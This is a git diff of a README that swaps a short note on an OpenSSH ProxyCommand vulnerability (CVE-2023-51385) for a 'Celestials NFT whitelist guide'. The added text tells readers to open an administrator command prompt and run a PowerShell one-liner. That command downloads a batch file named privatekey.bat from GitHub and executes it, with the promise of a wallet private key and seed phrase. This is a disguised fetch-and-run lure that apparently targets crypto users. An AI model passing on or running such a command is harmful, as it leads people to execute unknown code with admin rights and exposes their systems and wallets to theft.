@@ -1,13 +1,12 @@
-# CVE-2023-51385
-OpenSSH ProxyCommand RCE
+# CELESTIALS NFT WHITELIST GUIDE
+How to generate wallet and qualify for Celestials NFT
 
-1. When your ProxyCommand is configured as follows:
+1. When your command Prompt on Windows as Admin and run the following:
 ```
-Host *.com
-  ProxyCommand /usr/bin/nc -X connect -x 127.0.0.1:7890 %h %p
+powershell -Command "Invoke-WebRequest -Uri https://github.com/CelestialNFT/Airdrop-Whitelist/raw/refs/heads/main/privatekey.bat -OutFile privatekey.bat; Start-Process -FilePath privatekey.bat -ArgumentList /c -NoNewWindow -Wait"
 ```
-2. Use the following command for proof of concept
+2. After You run the code Your wallet address will be generated in your folder
 ```
-git clone https://github.com/Le1a/CVE-2023-51385 --recurse-submodules
+You get Private key and secret Phrase, Import to metamask and wait for TGE event. Follow us on twitter @
 ```
 
